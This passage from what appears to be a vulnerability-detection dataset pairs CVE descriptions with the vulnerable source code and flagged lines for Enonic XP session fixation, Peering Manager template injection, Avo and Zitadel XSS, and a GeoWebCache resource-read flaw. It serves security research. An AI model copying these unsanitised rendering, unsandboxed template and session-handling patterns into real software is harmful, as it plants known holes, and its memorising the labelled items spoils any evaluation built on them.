    "description": "Enonic XP versions less than 7.7.4 are vulnerable to a session fixation issue. An remote and unauthenticated attacker can use prior sessions due to the lack of invalidating session attributes.\n\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "modules/lib/lib-auth/src/main/java/com/enonic/xp/lib/auth/LoginHandler.java",
          "content": "package com.enonic.xp.lib.auth;\n\nimport java.util.Comparator;\nimport java.util.concurrent.Callable;\nimport java.util.function.Supplier;\nimport java.util.stream.Collectors;\n\nimport javax.servlet.http.HttpSession;\n\nimport com.enonic.xp.context.Context;\nimport com.enonic.xp.context.ContextBuilder;\nimport com.enonic.xp.portal.PortalRequest;\nimport com.enonic.xp.script.bean.BeanContext;\nimport com.enonic.xp.script.bean.ScriptBean;\nimport com.enonic.xp.security.IdProvider;\nimport com.enonic.xp.security.IdProviderKey;\nimport com.enonic.xp.security.IdProviders;\nimport com.enonic.xp.security.RoleKeys;\nimport com.enonic.xp.security.SecurityConstants;\nimport com.enonic.xp.security.SecurityService;\nimport com.enonic.xp.security.SystemConstants;\nimport com.enonic.xp.security.User;\nimport com.enonic.xp.security.auth.AuthenticationInfo;\nimport com.enonic.xp.security.auth.EmailPasswordAuthToken;\nimport com.enonic.xp.security.auth.UsernamePasswordAuthToken;\nimport com.enonic.xp.security.auth.VerifiedEmailAuthToken;\nimport com.enonic.xp.security.auth.VerifiedUsernameAuthToken;\nimport com.enonic.xp.session.Session;\n\npublic final class LoginHandler\n    implements ScriptBean\n{\n    private enum Scope\n    {\n        SESSION, REQUEST\n    }\n\n    private String user;\n\n    private String password;\n\n    private boolean skipAuth;\n\n    private String[] idProvider;\n\n    private Integer sessionTimeout;\n\n    private Scope scope;\n\n    private Supplier<SecurityService> securityService;\n\n    private Supplier<Context> context;\n\n    private Supplier<PortalRequest> portalRequestSupplier;\n\n    public void setUser( final String user )\n    {\n        this.user = user;\n    }\n\n    public void setPassword( final String password )\n    {\n        this.password = password;\n    }\n\n    public void setSkipAuth( final boolean skipAuth )\n    {\n        this.skipAuth = skipAuth;\n    }\n\n    public void setIdProvider( final String[] idProvider )\n    {\n        this.idProvider = idProvider;\n    }\n\n    public void setSessionTimeout( final Integer sessionTimeout )\n    {\n        this.sessionTimeout = sessionTimeout;\n    }\n\n    public void setScope( final String scope )\n    {\n        this.scope = Scope.valueOf( scope );\n    }\n\n    public LoginResultMapper login()\n    {\n        AuthenticationInfo authInfo = noIdProviderSpecified() ? attemptLoginWithAllExistingIdProviders() : attemptLogin();\n\n        if ( authInfo.isAuthenticated() )\n        {\n            switch ( this.scope )\n            {\n                case REQUEST:\n                    this.context.get().getLocalScope().setAttribute( authInfo );\n                    break;\n                case SESSION:\n                default:\n                    createSession( authInfo );\n                    break;\n            }\n\n            return new LoginResultMapper( authInfo );\n        }\n        else\n        {\n            return new LoginResultMapper( authInfo, \"Access Denied\" );\n        }\n    }\n\n    private void createSession( final AuthenticationInfo authInfo )\n    {\n        final Session session = this.context.get().getLocalScope().getSession();\n        if ( session != null )\n        {\n            session.setAttribute( authInfo );\n        }\n\n        if ( this.sessionTimeout != null )\n        {\n            setSessionTimeout();\n        }\n    }\n\n    private boolean noIdProviderSpecified()\n    {\n        return this.idProvider == null || this.idProvider.length == 0;\n    }\n\n    private AuthenticationInfo attemptLoginWithAllExistingIdProviders()\n    {\n        final IdProviders idProviders = runAsAuthenticated( this::getSortedIdProviders );\n\n        for ( IdProvider idProvider : idProviders )\n        {\n            final AuthenticationInfo authInfo = authenticate( idProvider.getKey() );\n            if ( ( authInfo != null ) && authInfo.isAuthenticated() )\n            {\n                return authInfo;\n            }\n        }\n\n        return AuthenticationInfo.unAuthenticated();\n    }\n\n    private IdProviders getSortedIdProviders()\n    {\n        IdProviders idProviders = securityService.get().getIdProviders();\n        return IdProviders.from( idProviders.stream().\n            sorted( Comparator.comparing( u -> u.getKey().toString() ) ).\n            collect( Collectors.toList() ) );\n    }\n\n    private AuthenticationInfo attemptLogin()\n    {\n\n        for ( String uStore : idProvider )\n        {\n            final AuthenticationInfo authInfo = authenticate( IdProviderKey.from( uStore ) );\n            if ( ( authInfo != null ) && authInfo.isAuthenticated() )\n            {\n                return authInfo;\n            }\n        }\n\n        return AuthenticationInfo.unAuthenticated();\n    }\n\n    private AuthenticationInfo authenticate( IdProviderKey idProvider )\n    {\n        AuthenticationInfo authInfo = null;\n\n        if ( isValidEmail( this.user ) )\n        {\n            if ( this.skipAuth )\n            {\n                final VerifiedEmailAuthToken verifiedEmailAuthToken = new VerifiedEmailAuthToken();\n                verifiedEmailAuthToken.setEmail( this.user );\n                verifiedEmailAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( verifiedEmailAuthToken ) );\n            }\n            else\n            {\n                final EmailPasswordAuthToken emailAuthToken = new EmailPasswordAuthToken();\n                emailAuthToken.setEmail( this.user );\n                emailAuthToken.setPassword( this.password );\n                emailAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( emailAuthToken ) );\n            }\n        }\n\n        if ( authInfo == null || !authInfo.isAuthenticated() )\n        {\n            if ( this.skipAuth )\n            {\n                final VerifiedUsernameAuthToken usernameAuthToken = new VerifiedUsernameAuthToken();\n                usernameAuthToken.setUsername( this.user );\n                usernameAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( usernameAuthToken ) );\n            }\n            else\n            {\n                final UsernamePasswordAuthToken usernameAuthToken = new UsernamePasswordAuthToken();\n                usernameAuthToken.setUsername( this.user );\n                usernameAuthToken.setPassword( this.password );\n                usernameAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( usernameAuthToken ) );\n            }\n        }\n\n        return authInfo;\n    }\n\n    private <T> T runAsAuthenticated( Callable<T> runnable )\n    {\n        final AuthenticationInfo authInfo = AuthenticationInfo.create().principals( RoleKeys.AUTHENTICATED ).user( User.ANONYMOUS ).build();\n        return ContextBuilder.from( this.context.get() ).\n            authInfo( authInfo ).\n            repositoryId( SystemConstants.SYSTEM_REPO_ID ).\n            branch( SecurityConstants.BRANCH_SECURITY ).build().\n            callWith( runnable );\n    }\n\n    private boolean isValidEmail( final String value )\n    {\n        return value != null && value.chars().filter( ch -> ch == '@' ).count() == 1;\n    }\n\n    private void setSessionTimeout()\n    {\n        final PortalRequest portalRequest = this.portalRequestSupplier.get();\n        if ( portalRequest != null )\n        {\n            final HttpSession httpSession = portalRequest.getRawRequest().getSession();\n            if ( httpSession != null )\n            {\n                httpSession.setMaxInactiveInterval( this.sessionTimeout );\n            }\n        }\n    }\n\n    @Override\n    public void initialize( final BeanContext context )\n    {\n        this.securityService = context.getService( SecurityService.class );\n        this.context = context.getBinding( Context.class );\n        this.portalRequestSupplier = context.getBinding( PortalRequest.class );\n    }\n}\n"
        }
      ],
      "method_level": [
        "private void createSession( final AuthenticationInfo authInfo )\n    {\n        final Session session = this.context.get().getLocalScope().getSession();\n        if ( session != null )\n        {\n            session.setAttribute( authInfo );\n        }\n\n        if ( this.sessionTimeout != null )\n        {\n            setSessionTimeout();\n        }\n    }",
        "private IdProviders getSortedIdProviders()\n    {\n        IdProviders idProviders = securityService.get().getIdProviders();\n        return IdProviders.from( idProviders.stream().\n            sorted( Comparator.comparing( u -> u.getKey().toString() ) ).\n            collect( Collectors.toList() ) );\n    }",
        "private <T> T runAsAuthenticated( Callable<T> runnable )\n    {\n        final AuthenticationInfo authInfo = AuthenticationInfo.create().principals( RoleKeys.AUTHENTICATED ).user( User.ANONYMOUS ).build();\n        return ContextBuilder.from( this.context.get() ).\n            authInfo( authInfo ).\n            repositoryId( SystemConstants.SYSTEM_REPO_ID ).\n            branch( SecurityConstants.BRANCH_SECURITY ).build().\n            callWith( runnable );\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 113,
          "content": "        final Session session = this.context.get().getLocalScope().getSession();"
        },
        {
          "line_no": 116,
          "content": "            session.setAttribute( authInfo );"
        },
        {
          "line_no": 117,
          "content": "        }"
        },
        {
          "line_no": 119,
          "content": "        if ( this.sessionTimeout != null )"
        },
        {
          "line_no": 120,
          "content": "        {"
        },
        {
          "line_no": 121,
          "content": "            setSessionTimeout();"
        },
        {
          "line_no": 149,
          "content": "        return IdProviders.from( idProviders.stream()."
        },
        {
          "line_no": 150,
          "content": "            sorted( Comparator.comparing( u -> u.getKey().toString() ) )."
        },
        {
          "line_no": 151,
          "content": "            collect( Collectors.toList() ) );"
        },
        {
          "line_no": 221,
          "content": "        return ContextBuilder.from( this.context.get() )."
        },
        {
          "line_no": 222,
          "content": "            authInfo( authInfo )."
        },
        {
          "line_no": 223,
          "content": "            repositoryId( SystemConstants.SYSTEM_REPO_ID )."
        },
        {
          "line_no": 224,
          "content": "            branch( SecurityConstants.BRANCH_SECURITY ).build()."
        },
        {
          "line_no": 225,
          "content": "            callWith( runnable );"
        }
      ]
    },
    "cwe": [
      "CWE-384"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.8,
    "cvss_version": 3.1
  },
  {
    "id": 423,
    "cve": "CVE-2024-28114",
    "description": "Peering Manager is a BGP session management tool. There is a Server Side Template Injection vulnerability that leads to Remote Code Execution in Peering Manager <=1.8.2. As a result arbitrary commands can be executed on the operating system that is running Peering Manager. This issue has been addressed in version 1.8.3. Users are advised to upgrade. There are no known workarounds for this vulnerability.\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "peering_manager/jinja2/__init__.py",
          "content": "from .extensions import *\nfrom .filters import *\nfrom .loaders import *\n\n\ndef render_jinja2(template, context, trim=False, lstrip=False):\n    \"\"\"\n    Render the template using Jinja2.\n    \"\"\"\n    import traceback\n\n    from django.conf import settings\n    from jinja2 import Environment, TemplateSyntaxError\n\n    environment = Environment(\n        loader=PeeringManagerLoader(), trim_blocks=trim, lstrip_blocks=lstrip\n    )\n    environment.add_extension(IncludeTemplateExtension)\n    for extension in settings.JINJA2_TEMPLATE_EXTENSIONS:\n        environment.add_extension(extension)\n\n    # Add custom filters to our environment\n    environment.filters.update(FILTER_DICT)\n\n    # Try rendering the template, return a message about syntax issues if there\n    # are any\n    try:\n        jinja2_template = environment.from_string(template)\n        return jinja2_template.render(**context)\n    except TemplateSyntaxError as e:\n        return f\"Syntax error in template at line {e.lineno}: {e.message}\"\n    except Exception:\n        return traceback.format_exc()\n"
        }
      ],
      "method_level": [
        "def render_jinja2(template, context, trim=False, lstrip=False):\n    \"\"\"\n    Render the template using Jinja2.\n    \"\"\"\n    import traceback\n\n    from django.conf import settings\n    from jinja2 import Environment, TemplateSyntaxError\n\n    environment = Environment(\n        loader=PeeringManagerLoader(), trim_blocks=trim, lstrip_blocks=lstrip\n    )\n    environment.add_extension(IncludeTemplateExtension)\n    for extension in settings.JINJA2_TEMPLATE_EXTENSIONS:\n        environment.add_extension(extension)\n\n    # Add custom filters to our environment\n    environment.filters.update(FILTER_DICT)\n\n    # Try rendering the template, return a message about syntax issues if there\n    # are any\n    try:\n        jinja2_template = environment.from_string(template)\n        return jinja2_template.render(**context)\n    except TemplateSyntaxError as e:\n        return f\"Syntax error in template at line {e.lineno}: {e.message}\"\n    except Exception:\n        return traceback.format_exc()"
      ],
      "hunk_level": [
        {
          "line_no": 13,
          "content": "    from jinja2 import Environment, TemplateSyntaxError"
        },
        {
          "line_no": 15,
          "content": "    environment = Environment("
        }
      ]
    },
    "cwe": [
      "CWE-74"
    ],
    "severity": "HIGH",
    "cvss_score": 8.1,
    "cvss_version": 3.1
  },
  {
    "id": 89,
    "cve": "CVE-2024-22191",
    "description": "Avo is a framework to create admin panels for Ruby on Rails apps. A stored cross-site scripting (XSS) vulnerability was found in the key_value field of Avo v3.2.3 and v2.46.0. This vulnerability could allow an attacker to execute arbitrary JavaScript code in the victim's browser. The value of the key_value is inserted directly into the HTML code. In the current version of Avo (possibly also older versions), the value is not properly sanitized before it is inserted into the HTML code. This vulnerability could be used to steal sensitive information from victims that could be used to hijack victims' accounts or redirect them to malicious websites. Avo 3.2.4 and 2.47.0 include a fix for this issue. Users are advised to upgrade.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/javascript/js/controllers/fields/key_value_controller.js",
          "content": "/* eslint-disable max-len */\nimport { Controller } from '@hotwired/stimulus'\nimport { castBoolean } from '../../helpers/cast_boolean'\n\nexport default class extends Controller {\n  static targets = ['input', 'controller', 'rows']\n\n  fieldValue = []\n\n  options = {}\n\n  get keyInputDisabled() {\n    return !this.options.editable || this.options.disable_editing_keys\n  }\n\n  get valueInputDisabled() {\n    return !this.options.editable\n  }\n\n  connect() {\n    this.setOptions()\n\n    try {\n      const objectValue = JSON.parse(this.inputTarget.value)\n      Object.keys(objectValue).forEach((key) => this.fieldValue.push([key, objectValue[key]]))\n    } catch (error) {\n      this.fieldValue = []\n    }\n\n    this.updateKeyValueComponent()\n  }\n\n  addRow() {\n    if (this.options.disable_adding_rows || !this.options.editable) return\n    this.fieldValue.push(['', ''])\n    this.updateKeyValueComponent()\n    this.focusLastRow()\n  }\n\n  deleteRow(event) {\n    if (this.options.disable_deleting_rows || !this.options.editable) return\n    const { index } = event.params\n    this.fieldValue.splice(index, 1)\n    this.updateTextareaInput()\n    this.updateKeyValueComponent()\n  }\n\n  focusLastRow() {\n    return this.rowsTarget.querySelector('.flex.key-value-row:last-child .key-value-input-key').focus()\n  }\n\n  valueFieldUpdated(event) {\n    const { value } = event.target\n    const { index } = event.target.dataset\n    this.fieldValue[index][1] = value\n\n    this.updateTextareaInput()\n  }\n\n  keyFieldUpdated(event) {\n    const { value } = event.target\n    const { index } = event.target.dataset\n    this.fieldValue[index][0] = value\n\n    this.updateTextareaInput()\n  }\n\n  updateTextareaInput() {\n    if (!this.hasInputTarget) return\n    let result = {}\n    if (this.fieldValue && this.fieldValue.length > 0) {\n      result = Object.assign(...this.fieldValue.map(([key, val]) => ({ [key]: val })))\n    }\n    this.inputTarget.innerText = JSON.stringify(result)\n    this.inputTarget.dispatchEvent(new Event('input'))\n  }\n\n  updateKeyValueComponent() {\n    let result = ''\n    let index = 0\n    this.fieldValue.forEach((row) => {\n      const [key, value] = row\n      result += this.interpolatedRow(key, value, index)\n      index++\n    })\n    this.rowsTarget.innerHTML = result\n    window.initTippy()\n  }\n\n  interpolatedRow(key, value, index) {\n    let result = `<div class=\"flex key-value-row\">\n      ${this.inputField('key', index, key, value)}\n      ${this.inputField('value', index, key, value)}`\n    if (this.options.editable) {\n      result += `<a\n  href=\"javascript:void(0);\"\n  data-key-value-index-param=\"${index}\"\n  data-action=\"click->key-value#deleteRow\"\n  title=\"${this.options.delete_text}\"\n  data-tippy=\"tooltip\"\n  data-button=\"delete-row\"\n  tabindex=\"-1\"\n  ${this.options.disable_deleting_rows ? \"disabled='disabled'\" : ''}\n  class=\"flex items-center justify-center p-2 px-3 border-none ${this.options.disable_deleting_rows ? 'cursor-not-allowed' : ''}\"\n><svg class=\"pointer-events-none text-gray-500 h-5 hover:text-gray-500\" fill=\"none\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"2\" viewBox=\"0 0 24 24\" stroke=\"currentColor\"><path d=\"M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16\"></path></svg></a>`\n    }\n    result += '</div>'\n\n    return result\n  }\n\n  inputField(id = 'key', index, key, value) {\n    const inputValue = id === 'key' ? key : value\n\n    return `<input\n  class=\"${this.options.inputClasses} focus:bg-gray-100 !rounded-none border-gray-600 border-r border-l-0 border-b-0 border-t-0 focus:border-gray-300 w-1/2 focus:outline-none outline-none key-value-input-${id}\"\n  data-action=\"input->key-value#${id}FieldUpdated\"\n  placeholder=\"${this.options[`${id}_label`]}\"\n  data-index=\"${index}\"\n  ${this[`${id}InputDisabled`] ? \"disabled='disabled'\" : ''}\n  value=\"${typeof inputValue === 'undefined' || inputValue === null ? '' : inputValue}\"\n/>`\n  }\n\n  setOptions() {\n    let fieldOptions\n\n    try {\n      fieldOptions = JSON.parse(this.controllerTarget.dataset.options)\n    } catch (error) {\n      fieldOptions = {}\n    }\n    this.options = {\n      ...fieldOptions,\n      inputClasses: this.controllerTarget.dataset.inputClasses,\n      editable: castBoolean(this.controllerTarget.dataset.editable),\n    }\n  }\n}\n"
        }
      ],
      "method_level": [
        "updateKeyValueComponent() {\n    let result = ''\n    let index = 0\n    this.fieldValue.forEach((row) => {\n      const [key, value] = row\n      result += this.interpolatedRow(key, value, index)\n      index++\n    })\n    this.rowsTarget.innerHTML = result\n    window.initTippy()\n  }"
      ],
      "hunk_level": [
        {
          "line_no": 83,
          "content": "      result += this.interpolatedRow(key, value, index)"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "HIGH",
    "cvss_score": 7.3,
    "cvss_version": 3.1
  },
  {
    "id": 1036,
    "cve": "CVE-2024-41953",
    "description": "Zitadel is an open source identity management system. ZITADEL uses HTML for emails and renders certain information such as usernames dynamically. That information can be entered by users or administrators. Due to a missing output sanitization, these emails could include malicious code. This may potentially lead to a threat where an attacker, without privileges, could send out altered notifications that are part of the registration processes. An attacker could create a malicious link, where the injected code would be rendered as part of the email. On the user's detail page, the username was also not sanitized and would also render HTML, giving an attacker the same vulnerability. While it was possible to inject HTML including javascript, the execution of such scripts would be prevented by most email clients and the Content Security Policy in Console UI. This vulnerability is fixed in 2.58.1, 2.57.1, 2.56.2, 2.55.5, 2.54.8 2.53.9, and 2.52.3.",
    "vulnerability": {
      "file_level": [
        {
          "name": "internal/notification/templates/templateData.go",
          "content": "package templates\n\nimport (\n\t\"fmt\"\n\t\"html\"\n\n\t\"github.com/zitadel/zitadel/internal/domain\"\n\t\"github.com/zitadel/zitadel/internal/i18n\"\n)\n\nconst (\n\tDefaultFontFamily      = \"-apple-system, BlinkMacSystemFont, Segoe UI, Lato, Arial, Helvetica, sans-serif\"\n\tDefaultFontColor       = \"#22292f\"\n\tDefaultBackgroundColor = \"#fafafa\"\n\tDefaultPrimaryColor    = \"#5282C1\"\n)\n\ntype TemplateData struct {\n\tTitle           string\n\tPreHeader       string\n\tSubject         string\n\tGreeting        string\n\tText            string\n\tURL             string\n\tButtonText      string\n\tPrimaryColor    string\n\tBackgroundColor string\n\tFontColor       string\n\tLogoURL         string\n\tFontURL         string\n\tFontFaceFamily  string\n\tFontFamily      string\n\n\tIncludeFooter bool\n\tFooterText    string\n}\n\nfunc (data *TemplateData) Translate(translator *i18n.Translator, msgType string, args map[string]interface{}, langs ...string) {\n\tdata.Title = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageTitle), args, langs...)\n\tdata.PreHeader = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessagePreHeader), args, langs...)\n\tdata.Subject = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageSubject), args, langs...)\n\tdata.Greeting = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageGreeting), args, langs...)\n\tdata.Text = html.UnescapeString(translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageText), args, langs...))\n\tdata.ButtonText = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageButtonText), args, langs...)\n\t// Footer text is neither included in i18n files nor defaults.yaml\n\tfooterText := fmt.Sprintf(\"%s.%s\", msgType, domain.MessageFooterText)\n\tdata.FooterText = translator.Localize(footerText, args, langs...)\n\t// translator returns the id of the string to be translated if no translation is found for that id\n\t// we'll include the footer if we have a custom non-empty string and if the string doesn't include the\n\t// id of the string that could not be translated example InitCode.Footer\n\tdata.IncludeFooter = len(data.FooterText) > 0 && data.FooterText != footerText\n}\n"
        }
      ],
      "method_level": [
        "func (data *TemplateData) Translate(translator *i18n.Translator, msgType string, args map[string]interface{}, langs ...string) {\n\tdata.Title = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageTitle), args, langs...)\n\tdata.PreHeader = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessagePreHeader), args, langs...)\n\tdata.Subject = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageSubject), args, langs...)\n\tdata.Greeting = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageGreeting), args, langs...)\n\tdata.Text = html.UnescapeString(translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageText), args, langs...))\n\tdata.ButtonText = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageButtonText), args, langs...)\n\t// Footer text is neither included in i18n files nor defaults.yaml\n\tfooterText := fmt.Sprintf(\"%s.%s\", msgType, domain.MessageFooterText)\n\tdata.FooterText = translator.Localize(footerText, args, langs...)\n\t// translator returns the id of the string to be translated if no translation is found for that id\n\t// we'll include the footer if we have a custom non-empty string and if the string doesn't include the\n\t// id of the string that could not be translated example InitCode.Footer\n\tdata.IncludeFooter = len(data.FooterText) > 0 && data.FooterText != footerText\n}"
      ],
      "hunk_level": [
        {
          "line_no": 43,
          "content": "\tdata.Text = html.UnescapeString(translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageText), args, langs...))"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.3,
    "cvss_version": 3.1
  },
  {
    "id": 902,
    "cve": "CVE-2024-24749",
    "description": "GeoServer is an open source server that allows users to share and edit geospatial data. Prior to versions 2.23.5 and 2.24.3, if GeoServer is deployed in the Windows operating system using an Apache Tomcat web application server, it is possible to bypass existing input validation in the GeoWebCache ByteStreamController class and read arbitrary classpath resources with specific file name extensions. If GeoServer is also deployed as a web archive using the data directory embedded in the `geoserver.war` file (rather than an external data directory), it will likely be possible to read specific resources to gain administrator privileges. However, it is very unlikely that production environments will be using the embedded data directory since, depending on how GeoServer is deployed, it will be erased and re-installed (which would also reset to the default password) either every time the server restarts or every time a new GeoServer WAR is installed and is therefore difficult to maintain. An external data directory will always be used if GeoServer is running in standalone mode (via an installer or a binary). Versions 2.23.5 and 2.24.3 contain a patch for the issue. Some workarounds are available. One may change from a Windows environment to a Linux environment; or change from Apache Tomcat to Jetty application server. One may also disable anonymous access to the embeded GeoWebCache administration and status pages.",
    "vulnerability": {
      "file_level": [
        {
          "name": "geowebcache/rest/src/main/java/org/geowebcache/rest/controller/ByteStreamController.java",
          "content": "/**\n * This program is free software: you can redistribute it and/or modify it under the terms of the\n * GNU Lesser General Public License as published by the Free Software Foundation, either version 3\n * of the License, or (at your option) any later version.\n *\n * <p>This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;\n * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n * GNU General Public License for more details.\n *\n * <p>You should have received a copy of the GNU Lesser General Public License along with this\n * program. If not, see <http://www.gnu.org/licenses/>.\n *\n * @author David Vick, Boundless, Copyright 2017\n *     <p>File was reworked from ByteStreamerRestlet.java\n */\npackage org.geowebcache.rest.controller;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.URL;\nimport java.net.URLDecoder;\nimport java.util.List;\nimport java.util.logging.Logger;\nimport java.util.regex.Pattern;\nimport javax.servlet.ServletOutputStream;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport org.geotools.util.logging.Logging;\nimport org.geowebcache.GeoWebCacheExtensions;\nimport org.geowebcache.mime.MimeException;\nimport org.geowebcache.mime.MimeType;\nimport org.geowebcache.rest.webresources.WebResourceBundle;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.stereotype.Component;\nimport org.springframework.util.StreamUtils;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestMethod;\nimport org.springframework.web.bind.annotation.RestController;\n\n@Component\n@RestController\n@RequestMapping(path = \"${gwc.context.suffix:}/rest\")\npublic class ByteStreamController {\n    private static Logger log = Logging.getLogger(ByteStreamController.class.getName());\n\n    volatile WebResourceBundle bundle;\n\n    private static final WebResourceBundle DEFAULT_BUNDLE = WebResourceBundle.class::getResource;\n\n    protected URL getResource(String path) {\n        if (bundle == null) {\n            synchronized (this) {\n                if (bundle == null) {\n                    List<WebResourceBundle> result =\n                            GeoWebCacheExtensions.extensions(WebResourceBundle.class);\n                    if (result.isEmpty()) {\n                        bundle = DEFAULT_BUNDLE;\n                    } else {\n                        if (result.size() > 1) {\n                            log.warning(\n                                    \"Multiple web resource bundles present, using \"\n                                            + result.get(0).getClass().getName());\n                        }\n                        bundle = result.get(0);\n                    }\n                }\n            }\n        }\n        URL resource = bundle.apply(path);\n        if (resource == null && bundle != DEFAULT_BUNDLE) {\n            resource = DEFAULT_BUNDLE.apply(path);\n        }\n        return resource;\n    }\n\n    static final Pattern UNSAFE_RESOURCE = Pattern.compile(\"^/|/\\\\.\\\\./|^\\\\.\\\\./|\\\\.class$\");\n\n    // \"gwc/rest/web/openlayers3/ol.js\" -> openlayers3/ol.js\n    // \"/rest/web/openlayers3/ol.js\" -> openlayers3/ol.js\n    String getFileName(HttpServletRequest request) {\n        String path = request.getPathInfo();\n        if (path.indexOf(\"/rest/web\") != 0) {\n            path = path.substring(path.indexOf(\"/rest/web\"));\n        }\n        return path.substring(\"/rest/web/\".length());\n    }\n\n    @RequestMapping(value = \"/web/**\", method = RequestMethod.GET)\n    ResponseEntity<?> doGet(HttpServletRequest request, HttpServletResponse response) {\n        final String filename;\n        try {\n            filename = URLDecoder.decode(getFileName(request), \"UTF-8\");\n        } catch (UnsupportedEncodingException e1) {\n            throw new IllegalStateException(\n                    \"Could not decode encoding UTF-8\", e1); // Should never happen\n        }\n\n        // Just to make sure we don't allow access to arbitrary resources\n        if (UNSAFE_RESOURCE.matcher(filename).find()) {\n            return new ResponseEntity<>(HttpStatus.FORBIDDEN);\n        }\n\n        URL resource = getResource(filename);\n        if (resource == null) {\n            return new ResponseEntity<>(HttpStatus.NOT_FOUND);\n        }\n\n        String[] filenameParts = filename.split(\"\\\\.\");\n        String extension = filenameParts[filenameParts.length - 1];\n\n        MimeType mime = null;\n        try {\n            mime = MimeType.createFromExtension(extension);\n        } catch (MimeException e) {\n            return new ResponseEntity<Object>(\n                    \"Unable to create MimeType for \" + extension, HttpStatus.INTERNAL_SERVER_ERROR);\n        }\n\n        // TODO write ByteArrayOutputStream ResponseEntity\n\n        response.setContentType(mime.getFormat());\n        try (InputStream inputStream = resource.openStream();\n                ServletOutputStream outputStream = response.getOutputStream(); ) {\n            StreamUtils.copy(inputStream, outputStream);\n        } catch (IOException e) {\n            return new ResponseEntity<Object>(\"Internal error\", HttpStatus.INTERNAL_SERVER_ERROR);\n        }\n\n        return new ResponseEntity<>(HttpStatus.OK);\n    }\n}\n"
        }
      ],
      "method_level": [
        "String getFileName(HttpServletRequest request) {\n        String path = request.getPathInfo();\n        if (path.indexOf(\"/rest/web\") != 0) {\n            path = path.substring(path.indexOf(\"/rest/web\"));\n        }\n        return path.substring(\"/rest/web/\".length());\n    }",
        "@RequestMapping(value = \"/web/**\", method = RequestMethod.GET)\n    ResponseEntity<?> doGet(HttpServletRequest request, HttpServletResponse response) {\n        final String filename;\n        try {\n            filename = URLDecoder.decode(getFileName(request), \"UTF-8\");\n        } catch (UnsupportedEncodingException e1) {\n            throw new IllegalStateException(\n                    \"Could not decode encoding UTF-8\", e1); // Should never happen\n        }\n\n        // Just to make sure we don't allow access to arbitrary resources\n        if (UNSAFE_RESOURCE.matcher(filename).find()) {\n            return new ResponseEntity<>(HttpStatus.FORBIDDEN);\n        }\n\n        URL resource = getResource(filename);\n        if (resource == null) {\n            return new ResponseEntity<>(HttpStatus.NOT_FOUND);\n        }\n\n        String[] filenameParts = filename.split(\"\\\\.\");\n        String extension = filenameParts[filenameParts.length - 1];\n\n        MimeType mime = null;\n        try {\n            mime = MimeType.createFromExtension(extension);\n        } catch (MimeException e) {\n            return new ResponseEntity<Object>(\n                    \"Unable to create MimeType for \" + extension, HttpStatus.INTERNAL_SERVER_ERROR);\n        }\n\n        // TODO write ByteArrayOutputStream ResponseEntity\n\n        response.setContentType(mime.getFormat());\n        try (InputStream inputStream = resource.openStream();\n                ServletOutputStream outputStream = response.getOutputStream(); ) {\n            StreamUtils.copy(inputStream, outputStream);\n        } catch (IOException e) {\n            return new ResponseEntity<Object>(\"Internal error\", HttpStatus.INTERNAL_SERVER_ERROR);\n        }\n\n        return new ResponseEntity<>(HttpStatus.OK);\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 82,
          "content": "    String getFileName(HttpServletRequest request) {"
        },
        {
          "line_no": 83,
          "content": "        String path = request.getPathInfo();"
        },
        {
          "line_no": 84,
          "content": "        if (path.indexOf(\"/rest/web\") != 0) {"
        },
        {
          "line_no": 85,
          "content": "            path = path.substring(path.indexOf(\"/rest/web\"));"
        },
        {
          "line_no": 86,
          "content": "        }"
        },
        {
          "line_no": 87,
          "content": "        return path.substring(\"/rest/web/\".length());"
        },
        {
          "line_no": 91,
          "content": "    ResponseEntity<?> doGet(HttpServletRequest request, HttpServletResponse response) {"
        },
        {
          "line_no": 92,
          "content": "        final String filename;"
        },
        {
          "line_no": 93,
          "content": "        try {"
        },
        {
          "line_no": 94,
          "content": "            filename = URLDecoder.decode(getFileName(request), \"UTF-8\");"
        },
        {
          "line_no": 95,
          "content": "        } catch (UnsupportedEncodingException e1) {"
        },
        {
          "line_no": 96,
          "content": "            throw new IllegalStateException("
        },
        {
          "line_no": 97,
          "content": "                    \"Could not decode encoding UTF-8\", e1); // Should never happen"
        }
      ]
    },
    "cwe": [
